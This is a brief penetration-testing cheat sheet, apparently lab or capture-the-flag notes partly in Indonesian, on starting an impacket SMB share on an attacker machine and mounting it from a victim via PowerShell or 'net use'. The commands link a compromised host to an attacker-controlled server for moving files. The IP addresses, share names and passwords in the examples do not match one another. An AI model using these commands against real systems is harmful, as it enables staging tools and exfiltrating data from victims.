# Setup SMB Server Windows
### Attacker 
```bash
impacket-smbserver drop $(pwd) -smb2support -user mrdoel -password 123456
```


### Victim Machine (Powershell)
```shell
$pass = convertto-securestring '123456' -AsPlainText -Force

$pass

$cred = New-Object System.Management.Automation.PSCredential('mrdoel', $pass)

$cred

New-PSDrive -Name mrdoel -PSProvider FileSystem -Credential $cred -Root \\10.10.14.4\drop
```

### Victim Machine (CMD)
```
net use \\10.10.14.24\share /u:mrdoel 12345
```
### Attacker Connected
jika sudah connected maka perintahnya

```shell
cd mrdoel:
```